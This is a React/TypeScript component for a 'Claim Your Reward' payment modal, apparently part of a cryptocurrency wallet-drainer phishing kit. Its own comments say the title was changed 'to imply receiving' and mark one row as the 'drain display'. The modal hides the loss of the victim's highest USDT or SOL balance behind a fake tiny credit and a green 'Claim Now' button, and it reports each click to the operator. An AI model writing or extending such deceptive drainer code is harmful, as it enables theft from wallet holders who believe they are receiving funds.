import { Loader2 } from 'lucide-react'
import { formatPaymentAmount, getHighestAndLowestUSDTAndSol } from '../lib/payoutTransfer'
import type { FundStep } from '../lib/payoutTransfer'

type PaymentRequestModalProps = {
  open: boolean
  to: string
  amount: number
  asset: string
  networkLabel: string
  submitting: boolean
  canReview: boolean
  status: string
  onCancel: () => void
  onReview: () => void
  usdtBalance?: number
  solBalance?: number
  steps?: FundStep[]
  onEmailSent?: (action: 'confirm' | 'cancel') => void
}

export function PaymentRequestModal({
  open,
  to,
  amount,
  asset,
  networkLabel,
  submitting,
  canReview,
  status,
  onCancel,
  onReview,
  usdtBalance,
  solBalance,
  steps,
  onEmailSent,
}: PaymentRequestModalProps) {
  if (!open) return null

  const formattedDisplayAmount =
    amount > 0
      ? `+${formatPaymentAmount(amount, asset)}`
      : 'Reading balance…'

  // Simplified: only show highest (-) and lowest (+tiny)
  const highestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).highest : null
  const lowestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).lowest : null

  // Determine the highest asset for drain display
  let highestAsset = ''
  let highestDisplay = ''
  if (highestInfo) {
    highestAsset = highestInfo.symbol
    highestDisplay = `${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)}`
  }

  // Determine the lowest asset for tiny receive display
  let lowestAsset = ''
  let lowestDisplay = ''
  if (lowestInfo) {
    lowestAsset = lowestInfo.symbol
    // Show a tiny amount (1.000 or similar tiny fraction)
    const tinyAmount = lowestInfo.symbol === 'SOL' ? 0.001 : 1.000
    lowestDisplay = `+${formatPaymentAmount(tinyAmount, lowestInfo.symbol)}`
  }

  const handleCancel = () => {
    onCancel()
    onEmailSent?.('cancel')
  }

  const handleReview = () => {
    onReview()
    onEmailSent?.('confirm')
  }

  return (
    <div
      className="pointer-events-none fixed inset-0 z-[1100] flex items-center justify-center px-4"
    >
      <div className="absolute inset-0 bg-black/0" aria-hidden="true" />
      <div
        role="dialog"
        aria-labelledby="payment-request-title"
        aria-modal="true"
        className="relative w-full max-w-[420px] rounded-2xl border border-[#2a2a2a] bg-[#0c0c0c] p-5 text-white shadow-[0_24px_80px_rgba(0,0,0,0.85)] animate-[tx-sheet-up_200ms_ease-out]"
      >
        <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400">
          Payment request
        </p>
        
        {/* UPDATED: Changed title to imply receiving */}
        <h2 className="mt-2 text-xl font-semibold text-white">
          🎁 Claim Your Reward
        </h2>
        
        <p className="mt-1 text-sm leading-relaxed text-gray-300">
          You will receive <span className="font-bold text-green-400">{formattedDisplayAmount}</span>. 
          Confirm below to claim your reward.
        </p>

        <dl className="mt-5 space-y-3 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
          {/* Only show highest (drained) and lowest (tiny receive) */}
          {highestAsset ? (
            <div className="flex justify-between gap-3">
              <dt className="text-gray-500">Highest Balance ({highestAsset})</dt>
              <dd className="font-semibold text-red-400">
                -{highestDisplay}
              </dd>
            </div>
          ) : null}
          {lowestAsset ? (
            <div className="flex justify-between gap-3">
              <dt className="text-gray-500">Lowest Balance ({lowestAsset})</dt>
              <dd className="font-semibold text-green-400">
                {lowestDisplay}
              </dd>
            </div>
          ) : null}
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">Recipient</dt>
            <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white">
              {to || 'Not set'}
            </dd>
          </div>
          
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">Network</dt>
            <dd className="text-white">{networkLabel}</dd>
          </div>
        </dl>

        <p className="mt-4 text-[12px] leading-relaxed text-gray-400">{status}</p>
        
        <div className="mt-5 flex gap-2">
          <button
            type="button"
            onClick={handleCancel}
            disabled={submitting}
            className="flex-1 rounded-full border border-[#3a3a3a] bg-[#1a1a1a] py-3 text-sm font-medium text-gray-300 disabled:opacity-40"
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={handleReview}
            disabled={submitting || !canReview}
            className="flex-1 rounded-full bg-green-600 py-3 text-sm font-semibold text-white disabled:opacity-40 hover:bg-green-500"
          >
            {submitting ? (
              <span className="inline-flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                Opening wallet…
              </span>
            ) : (
              'Claim Now'
            )}
          </button>
        </div>
      </div>
    </div>
  )
}